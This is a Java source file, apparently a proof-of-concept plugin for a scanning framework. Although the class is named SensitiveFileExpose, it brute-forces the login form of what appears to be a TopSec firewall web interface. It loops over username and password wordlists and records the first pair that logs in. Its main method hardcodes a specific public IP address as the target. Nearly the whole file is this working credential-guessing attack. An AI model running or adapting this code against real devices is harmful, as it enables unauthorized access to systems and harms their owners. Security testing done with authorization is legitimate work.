package cn.com.sgcc.marki_with_maven.modules;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.security.KeyManagementException;
import java.security.NoSuchAlgorithmException;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import org.apache.http.NameValuePair;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.CloseableHttpResponse;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.message.BasicNameValuePair;
import org.apache.http.util.EntityUtils;

import cn.com.sgcc.marki_with_maven.misc.Tools;

public class SensitiveFileExpose implements IPocBase {

	@Override
	public Map info() {
		// TODO Auto-generated method stub
		Map info = new HashMap<String, Object>();
		info.put("name", "SensitiveFileExpose");
		return info;
	}

	@Override
	public boolean match(Map infodict) {
		// TODO Auto-generated method stub
		boolean ismatch = false;
		String ip = (String) infodict.get("ip");
		String port = (String) infodict.get("port");
		String serviceType = (String) infodict.get("service_type");
		String serviceVersion = (String) infodict.get("service_version");
		if ( serviceVersion.toLowerCase().contains("http") )
		{
			ismatch = true;
		}
		return ismatch;
	}

	@Override
	public boolean verify(Map infodict) {
		// TODO Auto-generated method stub
		String ip = (String) infodict.get("ip");
		String port = (String) infodict.get("port");
		String serviceType = (String) infodict.get("service_type");
		String serviceVersion = (String) infodict.get("service_version");
		boolean success = false;
		CloseableHttpClient customClient = null;
		try {
			String url = String.format("%s://%s:%s/cgi/maincgi.cgi?Url=Index", serviceType.contains("https") ? "https":"http", ip, port );
			HttpGet httpGet = new HttpGet(url);
			customClient = new Tools().getCustomAutoRedirectClient();
			CloseableHttpResponse resp = customClient.execute(httpGet);
			if ( resp.getStatusLine().getStatusCode() == 404 )
			{
				success = false;
				return success;
			}
			httpGet.releaseConnection();
			BufferedReader brUserName = new BufferedReader(new InputStreamReader(new FileInputStream(new File("data/topsec-username.txt"))));
			BufferedReader brPassWord = new BufferedReader(new InputStreamReader(new FileInputStream(new File("data/topsec-password.txt"))));
			ArrayList<String> userNames = new ArrayList<String>();
			ArrayList<String> passWords = new ArrayList<String>();
			String tmpuserName = "";
			String tmppassWord = "";
			while( (tmpuserName = brUserName.readLine() ) != null)
			{
				userNames.add(tmpuserName);
			}
			while(  (tmppassWord = brPassWord.readLine()) != null )
			{
				passWords.add(tmppassWord);
			}
			
			boolean isBreak = false;
			for(String userName : userNames)
			{
				if (isBreak )
					break;
				for (String passWord : passWords)
				{
//					CloseableHttpClient customClientLocal = getCustomClient();
					HttpPost httpPostLocal = new HttpPost(url);
					List<NameValuePair> list = new ArrayList<NameValuePair>(); 
					list.add(new BasicNameValuePair("username", userName));
					list.add(new BasicNameValuePair("passwd", passWord));
					list.add(new BasicNameValuePair("loginSubmitIpt", "%B5%C7%C2%BC"));
					httpPostLocal.setEntity(new UrlEncodedFormEntity(list, "gbk"));
					CloseableHttpResponse respLocal = customClient.execute(httpPostLocal);
					String content = EntityUtils.toString(respLocal.getEntity());
					httpPostLocal.releaseConnection();
					if(!content.toLowerCase().contains("alert") && respLocal.getStatusLine().getStatusCode() == 200)
					{
						infodict.put("extra", String.format("%s:%s", userName, passWord));
						success = true;
						isBreak = true;
						break;
					}
				}
			}
			
			
		} catch (KeyManagementException | NoSuchAlgorithmException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (ClientProtocolException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		finally
		{
			try {
				if(customClient != null)
					customClient.close();
			} catch (IOException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		}
		return success;
	}

	public static void main(String[] args) {
		// TODO Auto-generated method stub
		Map infodict = new HashMap<String, String>();
		infodict.put("ip", "218.25.90.167");
		infodict.put("port", "443");
		infodict.put("service_type", "https");
		infodict.put("service_version", "topsec");
		System.out.println(new SensitiveFileExpose().verify(infodict));
	}

}
